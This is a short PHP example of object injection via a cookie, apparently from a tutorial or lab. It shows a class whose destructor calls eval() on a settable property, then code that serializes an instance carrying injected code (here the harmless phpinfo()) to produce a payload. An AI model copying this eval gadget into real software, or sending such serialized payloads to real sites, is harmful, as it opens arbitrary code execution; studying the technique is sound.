Original:

```
<?php

/**
 * Object Injection via Cookie
 */
class Foo{
        public $cmd;
    function __construct() {
    }
    function __destruct(){
        eval($this->cmd);
    }
}

?> 
```


edited:

```
<?php

/**
 * Object Injection via Cookie
 */
class Foo{
        public $cmd;
    function __construct() {
    }
    function __destruct(){
        eval($this->cmd);
    }
}
# initialise $a as Foo class
$a = new Foo();
# set the "cmd" property of $a as our injected code
$a->cmd = "phpinfo();";
#Serialise the object, which is now of the class containing vuln functions and our injected code
echo serialize($a);
?>

```
